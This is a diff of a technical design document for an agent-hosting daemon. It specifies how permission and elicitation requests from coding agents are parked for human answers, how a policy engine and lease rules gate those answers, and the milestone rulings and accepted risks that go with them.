+  on(event: "settled", cb: (s: InteractionSnapshot) => void): () => void;
+  readonly interactions: readonly InteractionSnapshot[];
+  /** H24. `worker.config` is updated SYNCHRONOUSLY with this promise, never from the event stream —
+   *  neither agent emits `config_option_update` for a set (F34, F35). Membership can SHRINK, so a
+   *  caller must re-read the list and never cache one entry. */
+  setConfig(configId: string, value: string | number | boolean): Promise<readonly ConfigOptionView[]>;
+  readonly config: readonly ConfigOptionView[] | null;
+  /** Sugar for a one-turn `interaction` listener, removed on settle. */
+  prompt(input: PromptInput, opts?: PromptOptions & { onInteraction?: (r: InteractionRequestHandle) => void }): Promise<TurnResult>;
+}
+
+export type StreamEvent = … | { readonly type: "interaction"; readonly req: InteractionRequestHandle }
+                            | { readonly type: "interaction_settled"; readonly interaction: InteractionSnapshot };
+
+export interface InteractionRequestHandle {
+  readonly requestId: InteractionId;
+  readonly method: InteractionMethod;
+  readonly title: string;
+  readonly message: string;                       // "" for a permission
+  /** `kind` is the stable field — never `name` (F27). `[]` for an elicitation. */
+  readonly options: readonly PermissionOption[];
+  /** One entry per QUESTION, not per schema property (F30). `[]` for a permission. */
+  readonly fields: readonly ElicitationField[];
+  readonly expiresAt: string | null;
+  readonly settled: boolean;
+  /** D4 rule 2's ordering picks the option when `optionId` is omitted; the daemon re-checks. */
+  allow(optionId?: string): Promise<InteractionAnswerResult>;
+  /** permission ⇒ the offered `reject_once`; elicitation ⇒ `{action:"decline"}`. ONE verb for both,
+   *  because D10 says one lifecycle and a caller should not have to know which arrived. */
+  deny(): Promise<InteractionAnswerResult>;
+  /** Keyed by QUESTION id. The SDK never sends both a selection and its `_custom` twin (F30). */
+  answer(content: Record<string, string | number | boolean | string[]>): Promise<InteractionAnswerResult>;
+  /** `{action:"cancel"}` on the interaction. NOT a turn cancel — `worker.cancel()` is that. */
+  cancel(): Promise<InteractionAnswerResult>;
+}
+
+export interface Server { …; readonly runs: { create(r): Promise<RunSnapshot>; get(id): Promise<RunSnapshot>;
+                                              list(): Promise<readonly RunSnapshot[]>; cancel(id): Promise<RunSnapshot>;
+                                              events(id, o?): AsyncIterable<EventEnvelope> }; }
+
+// cli
+//   omni-acp interactions <wid>                      list the pending set
+//   omni-acp interactions answer <wid> <reqId> --allow|--deny|--value q=v
+//   omni-acp config <wid> <configId> <value>
+//   omni-acp runs [--watch] · omni-acp deliveries [--redeliver <id>]
+
+// testkit
+export function runInteractionConformance(name: string, make: () => InteractionStrategy, clock: FakeClock): void;
+export function runPolicyConformance(name: string, make: (o: PolicyFixtureOptions) => InteractionStrategy): void;
+export function fakeWebhookReceiver(): Promise<FakeReceiver>;   // records signatures; can 500 / 410 / hang
+export function tempRepo(): Promise<{ dir: string; dispose(): Promise<void> }>;
+export function tempNonRepo(): Promise<{ dir: string; initRepo(): Promise<void>; dispose(): Promise<void> }>;
+export function fakeDiffProvider(): DiffProvider;
+export function fixtureAgentPath(name: … | "elicit-oneof" | "elicit-custom" | "elicit-multi"
+                                       | "elicit-never-answers" | "stall-silent" | "stall-in-tool"
+                                       | "permission-allow-always-only"): string;
+/** Builds the EXACT claude-acp v1 elicitation shape from transcript `12`: flat scope, `oneOf` not
+ *  `enum`, the paired `_custom` property with its `_meta` marker, no `required` array, and the
+ *  `AskUserQuestion` tool-call mirror. A fixture that got this wrong would make every M2-A test agree
+ *  with a shape no agent sends. */
+export function elicitationScript(a: ScriptedAgent, q: {…}): Promise<{ action: string; content?: … }>;
+```
+
+| new fixture | behaviour | covers the gap |
+| ----------- | --------- | -------------- |
+| `elicit-oneof.mjs` | one question, `oneOf[].const` + the paired `_custom` property, mirrored as an `AskUserQuestion` tool call | F30, F32 |
+| `elicit-custom.mjs` | the same, answered with a value outside `oneOf` | the `question_0_custom` routing rule |
+| `elicit-multi.mjs` | **two** questions | the corpus has none; multi-question forms are `unverified` for both real agents |
+| `elicit-never-answers.mjs` | issues `elicitation/create` and never resolves | the ONLY way to test `parkTimeoutAction` — the corpus answered both elicitations in ~1 ms |
+| `stall-in-tool.mjs` | opens `tool_call{status:"pending"}`, never terminalizes it, never speaks again | F36's tool budget and `strandedToolCalls` |
+| `stall-silent.mjs` | one update, then silence, no tool open | the `silentMs` budget |
+| `permission-allow-always-only.mjs` | offers ONLY `{kind:"allow_always"}` | D4 rules 3 + 4: the engine must answer `-32603`, never select it |
 ---
 
 ## 6. Supervisor — cross-platform design
@@ -3487,6 +4934,70 @@ design doc, the design doc is what gets amended (M1-R4).
 | The vendor patch reconstruction assumes LF line endings and text files | The extractor returns `null` rather than a wrong patch when the reconstructed hunk line counts disagree with `oldLines`/`newLines`; the `git apply` assertion is `skipIf(win32)` until a real Windows observation exists. |
 | `mcpServers` is still always `[]`, so the MCP `type` injection rule (§12.3 row 22) ships untested against a real server | Implemented and unit-tested, **unreachable from the wire**, and explicitly listed in §2.3 as M2. DESIGN §8 calls `mcpServers` the highest-risk attack surface; shipping it half-tested would be worse than not shipping it. |
 
+### 11.7 M2 grading — the three proposals
+
+Grade first, then the rulings. Each proposal's strongest idea is grafted and named. All three were read
+against the shipped code and both corpora, and where a proposal made a checkable claim I checked it.
+
+| Proposal | Strongest idea (grafted) | Grade |
+| -------- | ------------------------ | ----- |
+| **P1 (interaction)** | **F42 — `clientCapabilities: {}` is hard-coded in TWO files, and the second one is the wake path.** Nobody else noticed that `session-open.ts:251` would silently drop `elicitation` from a parked worker the first time it hibernated, which is a bug that only appears in production and only after 30 minutes. Also grafted whole: the elicitation form parser as a **total** function (an unparseable schema yields `fields: []` and every property in `unmodelled`, so `answer` becomes impossible while `deny` stays possible), `selectOption` as the single extraction point that keeps `permission-responder.test.ts` passing **unedited**, and the ceiling written in a deliberately coarser language than the rule language so the 403 is a proof rather than a hope. | **A** |
+| **P2 (reliability)** | **Restart safety made concrete, and `strandedToolCalls`.** It is the only proposal that says out loud what happens to a delivery interrupted between `fetch` and `settle` (at-least-once, `deliveryId` is the dedupe key, `requeueStale` deliberately does not increment `attempt`), the only one with an SSRF gate on the daemon's first outbound surface, the only one that spotted that `patch` over a shared worktree can be **internally inconsistent** rather than merely misattributed, and the only one that refused to synthesize a tool status the agent never sent. Its env module is also the only one that noticed Windows env names are case-**insensitive**. | **A** |
+| **P3 (delivery)** | **The Land step's mechanics, and the `cases/` split.** It is the only proposal that answers "how do six work packages avoid meeting in `worker.ts`, `registry.ts` and `cases.ts`" with a concrete list — nine named hunks, a per-feature route module, a per-feature client *channel* file, and `tests/compat/src/cases/<feature>.ts` — which is the mechanism that made M1 work and is reused here verbatim. Also grafted: `watchdogStep` as a pure fold beside a thin timer (the `HibernateTimer` shape), and the generic `TurnInput.prompt_result.meta` hunk, which lets the git provider land with **zero** edits to a frozen file. | **A−** |
+
+**Where all three converged**, which is itself evidence: the quiet window is anchored on the last update and
+never on the prompt response (F25); `configOptions` is replaced wholesale from the method result and never
+from the stream (F34, F35); the policy engine produces a `PolicyAction` and never an `optionId`; matching on
+an option's `name` is forbidden (F27); `parkTimeoutAction` has no `allow`; containment runs before the
+prompt is sent (F37); and the interaction lifecycle is one lifecycle over two methods. Where three
+independent readings agree, the ruling is a recording, not a decision.
+
+### 11.8 M2 rulings
+
+| # | Question | Ruling and why |
+| - | -------- | -------------- |
+| M2-R1 | Two slices, or one milestone? | **Two, and M2-A must be shippable alone.** With no `policy` / `diff` / `webhooks` / `runs` injected the daemon is M1 plus a park, and the whole M1 suite proves it. A milestone whose first half cannot ship is a milestone with one delivery date. |
+| M2-R2 | New error codes, against D29's "exactly DESIGN §5.4, no additions"? | **`interaction_not_found` (404) and `interaction_settled` (409) only; `run_not_found` is REFUSED.** `/v1/workers/{wid}/interactions/{reqId}` addresses **two** resources in one path and a bare 404 cannot say which is gone — a client that retries a worker 404 by recreating its worker would do so over a stale reqId, and a double-submit folded into `worker_busy` sends an SDK into its prompt queue. `/v1/runs/{rid}` addresses exactly one, so its 404 is already unambiguous. Both are 404/409 on the wire, so no status table moves — only the name a client branches on. |
+| M2-R3 | `acp.interaction.payloadVersion`: flip to 2 with a mapped `request`, or keep the verbatim v1 body? | **Flip, and carry the agent's bytes beside it in `raw`.** `worker.ts` pre-announced exactly this (F45), two of three proposals asked for it, and P2's objection — an audit of a reshaped object audits our reshaping — is answered by `raw` rather than by refusing the map. `payloadVersion` is how a client tells the two shapes apart; that is the field's entire job (M1-R10). |
+| M2-R4 | Is `omni.policy_decision` emitted when an interaction parks, or only when it settles? | **Only at settlement — exactly one per interaction.** A parked request has no decision yet; writing one and correcting it later would make `reduceTurn.interactions` grow a row that was never true. The park is already announced by `acp.interaction{status:"pending", park}` **and** `omni.worker_state{reason:"interaction_parked"}`, which is what a log reader actually needs. `decision` therefore has no `"park"` arm. |
+| M2-R5 | Interaction status: add `parked`, or let `pending` mean it? | **`pending` means parked.** M1's three stay a strict prefix and gain `expired` + `cancelled`. An auto-resolved interaction is emitted once, already terminal, so `pending` is unambiguous on the wire, and a second word for one state is a second thing to keep in sync. The `park` block is what says a human is expected. |
+| M2-R6 | Who may answer? Lease-only, or lease-or-admin like `DELETE`? | **Lease-only, admin included.** L3's carve-out is for `DELETE`, which is a *rescue*; an answer mutates the agent's execution exactly as `prompt` does. Admin already has a one-call, audited, epoch-bumping path — `POST …/lease/steal` then answer — which is D13's "换个设备接管" spelled out and which leaves an `omni.lease{op:"stolen", by, reason}` where a lease-free admin answer would leave nothing. |
+| M2-R7 | May `parkTimeoutAction` be `"allow"`? | **No, and it is not a value.** An auto-allow on a timer is a remote-execution primitive whose only guard is a clock. An operator who wants that writes a policy rule that never parks — which is at least visible in a rule file. |
+| M2-R8 | A cancelled turn strands a tool call (F36). Synthesize `failed`, or report it? | **Report it: `TurnResult.strandedToolCalls`, `verdict: "partial"`.** This AMENDS the claude corpus README's own advice ("must synthesize the terminal status"). Its *reason* — "aggregation must not block waiting for one" — is fully satisfied by reporting, while synthesizing asserts something about the agent that is not true: the tool may well have completed agent-side, and both agents simply never told us. We do not put a status on the wire that no agent sent. |
+| M2-R9 | How does an async `git` result reach a PURE fold before `idle` is emitted? | **A generic `meta` field on `TurnInput.prompt_result`**, merged into `state_update{idle}._meta` — the same channel `omni/vendorPatch` and `omni/warnings` already ride (§12.5). Against P2's new `collect_patch` close-out rung: a new `CloseOutAction` arm means every settle path must handle it and the ladder gains a rung that can hang, while one generic hunk in `turn-lifecycle.ts` lets the provider land with zero further edits to a frozen file. |
+| M2-R10 | Persist parked interactions across a daemon restart? | **No.** The agent process is gone, so the JSON-RPC id it was waiting on cannot be answered; persisting the row would only let a client answer into a void. Boot adoption records every parked interaction of a previous boot as `cancelled{by:"daemon"}` in the log, which is the same treatment M1-R8 gives the lease. |
+| M2-R11 | `policyCeiling`: static check, decision-time clamp, or both? | **Both, and the static half is deliberately coarser than the rule language.** Glob∩glob and regex∩regex containment is undecidable, so a ceiling written in the rule language could only be checked approximately — and a ceiling that *looks* precise while being checked approximately is worse than one that is honestly coarse. The static check is decidable, total and names the offending rule (403 at create); the clamp recovers precision at decision time and is never silent (`clamped` on the record **plus** a `TurnWarning`). |
+| M2-R12 | A blacklisted `env` key: drop it and report, or reject the request? | **Reject, `400`, naming the key.** A worker that silently ignored half the environment it was asked for behaves differently from what the caller asked for, and nothing says so. Dropping is right for MCP presets (§23.2) because there the *agent* refused a capability we asked for; here the *daemon* refuses a request the caller made, which is a 400. |
+| M2-R13 | D9's payload is seven keys. P2 and P3 both add `workerId`. | **Eight keys — `workerId` is added, and D9 is amended, not bent.** `/v1` is keyed on `workerId`; a receiver holding only `sessionId` cannot pull anything back, and the alternative is a `GET /v1/sessions/{sid}` that exists for no other reason. The `webhook-body-is-thin` guard pins the set at exactly eight. |
+| M2-R14 | Refuse `POST /v1/runs` under `eventLog.driver:"memory"`? | **No — allow it and report `RunSnapshot.persistence:"memory"`.** Consistent with `WorkerSnapshot.persistence` and with `local()`'s zero-file promise. A `local()` script gets working runs; it does not get a dead-letter queue, and it is **told so** rather than finding out. |
+| M2-R15 | `elicitation/create` arriving when the capability was NOT declared | **Register the handler always and answer `{action:"decline"}`** — D10's literal text ("仍发来则回 decline / cancel"). Not `-32601`: a `-32601` for a method the spec defines is a worse answer than a decline, and F28 shows the well-behaved case never asks anyway. |
+| M2-R16 | Where does option selection live once there is an engine? | **Below it, unchanged, in `permission-responder.ts`.** The engine's whole vocabulary is `PolicyAction`; it never sees and never produces an `optionId`. `selectOption` is extracted verbatim, `permission-responder.test.ts` passes **unedited**, and the `policy-never-names-an-option` guard fails the build if `core/src/policy/**` so much as contains the string `optionId`. That is what makes "D4's six hard rules preserved" a structural property rather than a promise. |
+| M2-R17 | A `path`-only policy rule | **A config LOAD error, and a `path` clause matches only when every listed path matches.** F38: codex's `locations[]` under-reports what a call touched, so a path clause can only ever *narrow* an allow some other clause already made — it must never *authorise*. The all-must-match half stops an unlisted second path laundering the first. |
+| M2-R18 | A `cmd` clause on a `tool_call` subject | **Rejected at COMPILE.** F38 again: codex's two-file read carries no `rawInput` at all, so there is nothing for a command regex to match on. Shipping a rule that can never fire is shipping dead policy an operator will plan around. |
+| M2-R19 | May a HUMAN pick an `allow_always` option? | **No by default (`400`, quoting D4 rule 3 and citing F26); `interaction.allowAlways:"human"` is the operator's opt-in and it is LOUD** — `blindsPolicy` on the decision, sticky `WorkerSnapshot.policyBlinded`, and a `TurnWarning{code:"policy_blinded"}` on every subsequent turn. We cannot un-blind the session; we can refuse to be silent about it. |
+| M2-R20 | Does the daemon's own watchdog cancel go through the lease? | **No — `cancelInternal` bypasses it deliberately.** The lease governs CLIENTS and the watchdog is not one; without the bypass the daemon's own timer `423`s itself the moment a real `createLease` replaces `alwaysGrantedLease`. The close it escalates into releases the lease and emits `omni.lease` as usual, so the transfer is still audited. |
+| M2-R21 | Does a parked interaction let the idle watchdog fire? | **No: a park disarms BOTH budgets, and unparking RE-BASES rather than resumes.** A human thinking is not a hung agent, and the park timer owns that deadline. Re-basing matters: a human who took twenty minutes must not hand the agent a budget that is already spent, which would cancel the very turn they just unblocked. This is M2's single cross-work-package invariant and it is asserted in three places (§21.4). |
+| M2-R22 | Is `POST …/config` allowed mid-turn? | **No — `409 worker_busy`, and the message says the behaviour is unknown rather than forbidden.** No agent was ever observed accepting a mid-turn `set_config_option`; F34 and F35 both set between turns. Fail closed, with a compat case to be added the moment somebody can observe it. |
+| M2-R23 | New event kinds for M2? | **Exactly one: `omni.run`.** Interactions reuse `acp.interaction` + `omni.policy_decision`; a config change is a Normalizer-synthesized `acp.session_update{config_option_update}` carrying `_meta["omni/source"]:"set_config_option"` (the same thing §12.3 already does for `current_mode_update`), so a streaming client still learns and an agent-emitted notification stays distinguishable from ours; a webhook delivery is a table plus a route. A run needs one because its state machine is not a worker's. |
+
+### 11.9 M2 risks accepted, with their mitigation
+
+| Risk | Mitigation |
+| ---- | ---------- |
+| **`parkTimeoutAction` has zero real-agent ground truth.** Both corpus elicitations were answered in ~1 ms; nobody knows whether claude-acp times an unanswered `elicitation/create` out on its own, or what it does with an answer that arrives ten minutes late. | Fixture-only (`elicit-never-answers.mjs`) under `fakeClock()`, `unverified` in the descriptor, and the compat suite refuses to assert it. Our park timer fires first by construction (`parkTimeoutMs` default 600 s). If the agent gave up first, our answer lands on a dead JSON-RPC id — which `settleAll` already tolerates, because it fires and forgets through `link.request`'s rejection path. **`interaction-park-timeout` (§27) is written to DISCOVER this, and it is the first M2 experiment to run.** |
+| **F26 is unfixable, only announceable.** After one `allow_always` the engine is never consulted again for that session, and no event says so. | `allowAlways:"never"` by default, even for humans; the opt-in sets sticky `policyBlinded` and warns on every later turn (M2-R19). We also cannot detect that a *human on some other client* picked one, nor that the agent already holds one. That is the honest limit of D4 rule 3 and §19.7 says so in prose. |
+| **`url`-mode elicitation, `elicitation/complete`, `action:"cancel"`, multi-question forms and MCP-originated elicitation are all schema-only.** | Every one is covered by a testkit fixture and listed in the descriptor's `unverified`. `url` is additionally **not declared**, so the untested path is also unreachable — declaring a mode we cannot service is how a turn hangs. |
+| **The wire moved without a version bump**: `session_info_update` appeared on claude (F25) and `fast-mode` on codex (F35), both against pinned adapter versions. | The descriptor tolerates unknown `sessionUpdate` kinds by design (`map: null` ⇒ `payloadVersion:1` passthrough) and `configOptions` is replaced wholesale. A compat case asserts that an unknown update kind and an unknown config entry both survive a full turn. The residual risk is that the **watchdog** counts host chrome (F41) as liveness — **accepted**: a host emitting frames is a host that is alive, which is exactly what the silent budget measures, and excluding chrome would need a vendor branch in a timing path. A spurious extra `silentMs` is far cheaper than a cancelled live turn. |
+| **Webhook delivery is at-least-once.** A delivery interrupted between `fetch` and `settle` is repeated. | Documented as **the guarantee**, not discovered as a bug: `deliveryId` is the idempotency key, receivers must dedupe on it, and `requeueStale` deliberately does not increment `attempt` (the attempt may never have reached the wire). Exactly-once needs a receiver-side ack we do not have. |
+| **Webhook SSRF has residual TOCTOU**: DNS can change between `assertWebhookUrl` and the connect. | The allowlist is the primary control and is fail-closed (`mode:"allowlist"` with an empty `allow` ⇒ `403`); the CIDR check over every resolved address is defence in depth; `redirect:"manual"` closes the redirect vector; the response body is never read. A per-connection address check needs a custom dispatcher and is deferred to M4 — recorded here rather than left implicit. |
+| **Two workers in one repo produce a patch that can be internally inconsistent**, not merely misattributed: the tree is the whole worktree and can contain a half-written file. | `patchInfo.quality:"shared_worktree"` plus a named warning. We do not attempt per-worker attribution; a real fix is one worktree per worker, which is a caller's decision and not the daemon's. |
+| **`patch` costs a subprocess pair per turn**, and `git add -A` is O(worktree). | `diff.mode:"on_write"` by default, `patch:"off"` per worker, bounded by `diff.timeoutMs`, and the turn is **never** failed by it. Measure on a 100 k-file repo before defaulting `"always"` anywhere. |
+| **`WorkerRow.env` persists client-supplied secrets in sqlite.** | Named, not hidden: `0600` file inside a `0700` `dataDir`, and an `env.persist:false` escape hatch that forces `resume.method: null` — trading hibernation for the exposure rather than waking into a silently different environment. A real credential store is M4. |
+| **`WhoAmIResponse.policyCeiling` widening from `null` to `PolicyCeiling \| null` is a compile break** for any consumer that wrote the literal `null` type. | The **only** type break in M2, and it is listed here so it is a decision rather than a surprise. The field never appears or disappears on the wire, which is the property it was declared for. |
+| **The M2 acceptance still rests on two agents, and they disagree about almost everything interesting**: claude asks permission and elicits, codex does neither. | That disagreement is the value: every case carries a `requires` list and codex's interaction cases are printed `capability` skips sourced from its own README, never silent passes. But "the same SDK code behaves identically" is still **not falsifiable** with two agents whose permission surfaces do not overlap, and §18's honesty rule stands. |
+| **A `requires_action` worker holds a process indefinitely under `parkTimeoutMs: 0`.** | It occupies a `maxWorkers` slot (F43: `OCCUPIES_A_SLOT` already includes it), so the bound is `maxWorkers`; `interaction.maxParked` bounds the per-worker queue; `parkTimeoutMs: 0` is opt-in per worker and never a default. |
+| **`SCHEMA_VERSION` 2 is a one-way door for a shared `dataDir`.** | The data-dir lock already forbids two live daemons; an operator who downgrades gets a loud startup failure naming the version and loses no data. Tested in both directions (§14.7's rule, unchanged). |
+| **The `PromptRequestBody` refine deletion is the single most dangerous hunk in M2.** A schema that silently stopped enforcing containment looks exactly like a schema that got more capable. | The `assert-prompt-content-is-called` architecture guard, plus an integration test that posts an out-of-`cwd` `resource_link` and asserts **both** the `400` **and** that the fixture agent recorded **zero** `session/prompt` calls. |
 ---
 
 ## 12. Normalizer — the full v1→v2 map (M1)
@@ -4522,3 +6033,861 @@ and the identical state-envelope sequence for every configured agent** — DESIG
 五个 v1 目标 agent 行为一致" made mechanical, with `verdict` and `stopReason` as the equality surface rather
 than raw payloads. With one real agent that criterion is **not falsifiable**, and §11.6 records that
 honestly rather than claiming otherwise.
+
+---
+
+## 19. The InteractionRequest lifecycle (M2-A; D4, D10)
+
+### 19.1 One lifecycle, two methods, a daemon-minted id
+
+D10 says the daemon converges `session/request_permission` and `elicitation/create` into one
+`InteractionRequest` lifecycle. M2 makes that literal: **one registry, one status vocabulary, one HTTP
+route, one SDK event, one `InteractionRecord`.** The two methods differ only in what the request carries
+(`options` vs `fields`) and in what an answer puts on the wire.
+
+The identity is **ours**. F33: the two methods share one agent→client JSON-RPC id counter — in transcript
+`12` the elicitation is id 0 and the later permission is id 1 — so the transport id can never be the
+interaction id. `InteractionId` is `x_<ULID>` from `IdGen.interaction()`, and the
+`interaction-id-is-daemon-minted` guard forbids reading a JSON-RPC `id` as one.
+
+```
+                    agent → client request (permission | elicitation)
+                                    │
+              Normalizer.mapPermissionRequest / mapElicitation   ← PURE, TOTAL, IDEMPOTENT
+                                    │  InteractionRequest (v2-shaped, both methods)
+                                    ▼
+                          PolicyEngine.decide()                  ← PURE; M2-A: constant `onUnresolved`
+                                    │
+              ┌──────────┬──────────┼──────────┬──────────────────────────┐
+           allow       deny       fail       park              (unknown subject ⇒ default, D4)
+              │          │          │          │
+      selectOption()  selectOption()│    status "pending" + park{expiresAt, onTimeout}
+              │          │          │    worker → requires_action{interaction_parked}
+              │          │          │    ctx.park() ⇒ watchdog disarmed, lease pinned, hibernate paused
+              │          │          │          │
+              │          │          │          ├── POST …/interactions/{reqId}  → answered
+              │      answer deny    │          ├── parkTimeoutMs elapses         → expired
+              │      then           │          ├── turn cancel / close / stop    → cancelled
+              │      session/cancel │          └── the ACP link dies             → failed
+              └──────────┴──────────┴──────────┘
+                                    │
+                  last un-park ⇒ worker → running{interaction_resolved}
+```
+
+### 19.2 D10's gate — and the migration hazard it exposes
+
+`clientCapabilitiesFor({onUnresolved, config})` is a pure function of the create request:
+
+| `onUnresolved` | declared |
+| -------------- | -------- |
+| `"park"` | `{ elicitation: { form: {} } }` |
+| `"deny"` / `"fail"` | `{}` |
+
+`url` is **never** declared. There is no browser here and `elicitation/complete` has never been observed;
+declaring a mode we cannot service is how a turn hangs. `interaction.declareUrlElicitation` exists, defaults
+false, and stays false until a real url handler sits behind it.
+
+F28 is this gate confirmed end to end on a real agent: declared ⇒ a real `elicitation/create`; `{}` and the
+byte-identical prompt ⇒ **no request and no tool call at all**, the model asks in prose and ends the turn.
+Not declaring is therefore **safe**, and declaring genuinely changes agent behaviour.
+
+**F42 is the hazard.** `clientCapabilities: {}` is hard-coded in two separate files —
+`handshake.ts:285` (create) and `session-open.ts:251` (**wake**). M2 threads the computed value through
+`SessionOpenOptions.clientCapabilities` and `SessionReopenOptions` **must be given the same value as
+`open`**, or a parked worker that hibernated wakes silently unable to be asked anything. There is a named
+regression test that fails against the current `session-open.ts`.
+
+`AgentCapabilitiesSnapshot.clientCapabilities` records what we actually sent, because F28 also says
+`initialize`'s `agentCapabilities` never mentions elicitation either way — our own declaration is the only
+record of why an agent asked in prose, and without it D10 is unauditable.
+
+### 19.3 Mapping `elicitation/create`
+
+The inbound registration is one line beside the permission one, and it **must** use `verbatim`:
+
+```ts
+.onRequest("elicitation/create", verbatim, (ctx) => h.onElicitation(ctx.params))
+```
+
+A `z.object` parse would strip `_meta._askUserQuestionCustomAnswer` — the marker that decides which of two
+properties the agent will read (F30) — and would strip the **flat** `sessionId` / `toolCallId`, which are the
+only scope this request carries (F29). `link.ts` already parses every inbound request with `verbatim` (F43),
+so this is a registration, not a mechanism. The `no-elicitation-schema-parse` guard fails the build on any
+`z.object(` / `.parse(` reached from an elicitation path under `core/src/**`.
+
+`mapElicitation` reads the params **flat** (F29): `{mode, sessionId, toolCallId, message, requestedSchema}`.
+A type that models scope as a nested object parses nothing a real claude-acp sends.
+
+### 19.4 The form, and the one rule that cost a wrong file
+
+F30 is the whole reason `ElicitationField` exists. One question becomes **two** schema properties:
+
+```jsonc
+"question_0":        { "type":"string", "title":"File name",
+                       "oneOf": [ {"const":"notes.md","title":"notes.md","description":"…"}, … ] },
+"question_0_custom": { "type":"string", "title":"Other",
+                       "_meta": { "_askUserQuestionCustomAnswer": { "questionId":"question_0",
+                                                                    "isCustomAnswer": true } } }
+```
+
+Our recorder filled **both** — `{question_0:"notes.md", question_0_custom:"omni-choice.txt"}` — and the agent
+used the **custom** one: it created `omni-choice.txt` and not the selected `notes.md`. The `_meta` marker
+silently wins, so a client that fills every declared property overrides the user's actual selection.
+
+Three rules follow, and each is a named test:
+
+1. **Answers are keyed by QUESTION id**, never by property name. `InteractionAnswerBody.content` and
+   `worker.on("interaction", r => r.answer({...}))` both take question ids.
+2. **Exactly one property per question reaches the wire.** `buildElicitationContent` decides which by
+   whether the value is one of the schema's own `oneOf[].const` / `enum` values: a match goes to
+   `field.id`, anything else goes to `field.customField ?? field.id`. Answering both members of a group is
+   `400`, and the test is named after the file transcript `12` wrongly created.
+3. **`oneOf[].const` and `enum` are both read.** The schema's own note says single-select uses either;
+   claude-acp sends `oneOf`, and a reader that knows only `enum` sees every question as free text.
+
+`mapElicitation` is **total**: a schema it cannot understand yields `fields: []` with every property in
+`unmodelled`, which makes `answer` impossible while leaving `deny` and `cancel` possible — better than a form
+that lies about its own shape. A property naming an unknown question is `400` **with the name in it**, never
+a silent drop.
+
+### 19.5 The `requires_action` state
+
+`running → requires_action` on the FIRST park; `requires_action → running` on the LAST un-park. `ctx.park()`
+is **refcounted** exactly like `Lease.pinExpiry()`, so two concurrent interactions park once and resolve once.
+
+While parked:
+
+| | |
+| --- | --- |
+| the lease | stays **pinned** (rule L6) — a parked worker must remain answerable, and an expiry we will not honour is a lie |
+| the hibernate timer | stays paused (it runs only in `ready`) |
+| the idle watchdog | **disarmed**, both budgets, and unparking **re-bases** (M2-R21, §21.4) |
+| `maxWorkers` | occupied — `OCCUPIES_A_SLOT` already lists `requires_action` (F43) |
+| `prompt` | `409 worker_busy` (DESIGN §5.1: prompt 在 running / requires_action 状态下返回 409). The SDK queues by default; `{queue:false}` throws |
+| `WorkerSnapshot.interactions` | non-empty **⟺** `state === "requires_action"`. That biconditional is an invariant test |
+
+`interaction.maxParked` (default 8) bounds the queue. Over it the **newest** is DENIED with
+`rule:"limit:max_parked"` and **never dropped** — an unanswered agent request hangs a turn forever.
+
+### 19.6 `POST /v1/workers/{wid}/interactions/{reqId}` (H22)
+
+**Lease-gated, admin included** (M2-R6). The check order is fixed and table-tested:
+
+> **visibility → worker state → interaction existence → lease → body shape → semantics → deliver**
+
+Lease **before** body shape, so a non-holder never learns the shape of somebody else's form. Existence
+**before** lease, so a stale request id does not report a lease problem it does not have.
+
+| condition | code | status | body extra |
+| --------- | ---- | ------ | ---------- |
+| answered and delivered | — | **200** | `InteractionAnswerResult` |
+| body fails the schema, or the wrong verb for this `method` (`allow` on an elicitation, `answer` on a permission) | `bad_request` | 400 | — |
+| `optionId` not in the **stored** request's `options` (D4 rule 1) | `bad_request` | 400 | message names the offered ids |
+| `optionId` whose `kind` is `allow_always` and `interaction.allowAlways:"never"` | `bad_request` | 400 | message quotes rule 3 and cites F26 |
+| `content` names an unknown question, both members of one group, a value outside `oneOf`/`enum` for a non-custom property, a wrong JSON type, or omits a `required` question | `bad_request` | 400 | message names the question id |
+| token cannot see the worker | `worker_not_found` | 404 | never leak existence |
+| `reqId` unknown on this worker | `interaction_not_found` | **404** | — |
+| already `answered` / `failed` / `expired` / `cancelled` | `interaction_settled` | **409** | `interaction:` the settled snapshot, naming who won |
+| worker `closed` | `worker_closed` | 410 | — |
+| not the holder, or a stale `Omni-Lease-Epoch` | `lease_held` | 423 | `lease:` the holder |
+| the ACP link died between admission and the answer | `interaction_settled` | 409 | `interaction.status === "failed"` |
+
+`GET /v1/workers/{wid}/interactions` (H23) is **ungated** (rule L2). An observer can watch a parked worker
+and see exactly what is being asked without being able to answer it — the whole of D5 applied to D10.
+
+### 19.7 D4's six hard rules, and the one thing the wire cannot tell us
+
+The rules stay exactly where M1 put them, in `permission-responder.ts`, **below** the policy engine
+(M2-R16). What M2 adds:
+
+| # | rule | how M2 keeps it unreachable |
+| - | ---- | --------------------------- |
+| 1 | only offered `optionId`s | rule files have no `optionId` vocabulary; `selectOption` is the only producer; `worker.ts`'s existing forge guard re-checks the answer against `offered` and downgrades to `-32603`; the HTTP path re-checks against the **stored** request. Three independent checks, because corpus `09` proves a violation is invisible downstream. |
+| 2 | allow order: session-grant id → `allow_once` | one implementation, shared by baseline, engine and the SDK's argument-less `allow()` |
+| 3 | never `allow_always` | `selectOption` filters `kind === "allow_always"` unconditionally; the HTTP path `400`s it; the operator override is `interaction.allowAlways:"human"` and it is loud (below) |
+| 4 | deny = offered `reject_once`, else `-32603` | `OptionChoice.kind === "none"` is the only path to a null response, and `worker.ts` already throws `AcpRequestError.internalError` on it |
+| 5 | never `outcome:"cancelled"` | the type: `RequestPermissionResponse` is constructed in exactly one place and `selectOption` never returns a cancel. `fail` cancels the turn with a **separate `session/cancel`** on a different channel |
+| 6 | unknown `kind` ⇒ non-grant | the matcher: an unlisted kind matches no `kind` clause and falls to `default`, whose fail-closed value in every shipped preset is `deny` or `park` |
+
+**F26 is the measured cost of breaking rule 3, and it is unfixable.** One `allow-with-updates` let the second
+Write of the same turn complete with **no second permission request**: one request, two files, `end_turn`, and
+**nothing on the wire announced the grant**. After it, the policy engine is simply never consulted again for
+that session and it receives no event telling it so.
+
+So: `allowAlways:"never"` is the default and applies to **every** source including a human `POST`.
+`"human"` is the operator's opt-in, and it makes the consequence loud — `blindsPolicy:true` on the decision,
+sticky `WorkerSnapshot.policyBlinded`, and `TurnWarning{code:"policy_blinded"}` on every subsequent turn of
+that worker. We cannot un-blind the session. We can refuse to be silent about it. What we still cannot detect
+is a human on some other client picking one, or an agent that already holds one — §11.9 records that as the
+honest limit of rule 3.
+
+### 19.8 `settleAll` — and why the order matters
+
+`settleAll(reason)` settles every parked request **synchronously deciding the outcome**, puts a real answer on
+the wire for each (`-32603` for a permission, `{action:"decline"}` for an elicitation), emits the envelopes,
+and **returns only once every held JSON-RPC promise has resolved**. It is idempotent and it is called from
+four places, one of which has a strict ordering requirement:
+
